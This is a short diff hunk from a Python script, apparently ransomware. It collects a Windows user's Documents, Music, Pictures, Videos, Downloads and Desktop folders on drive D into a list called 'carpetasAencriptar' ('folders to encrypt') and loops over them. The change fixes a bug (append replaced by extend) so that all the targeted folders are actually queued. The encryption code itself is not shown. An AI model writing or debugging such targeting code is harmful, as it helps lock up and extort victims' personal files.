@@ -37,7 +37,7 @@ if __name__ == '__main__':
         dvideos = 'D:\\Users\\'+usuario+pruebaono+'\\Videos'
         ddownloads= 'D:\\Users\\'+usuario+pruebaono+'\\Downloads'
         ddesktop= 'D:\\Users\\'+usuario+pruebaono+'\\Desktop'
-        carpetasAencriptar.append(ddocs,dmusic,dpictures,dvideos,ddownloads,ddesktop)
+        carpetasAencriptar.extend([ddocs,dmusic,dpictures,dvideos,ddownloads,ddesktop])
     except:
         pass
     for carpeta in carpetasAencriptar:
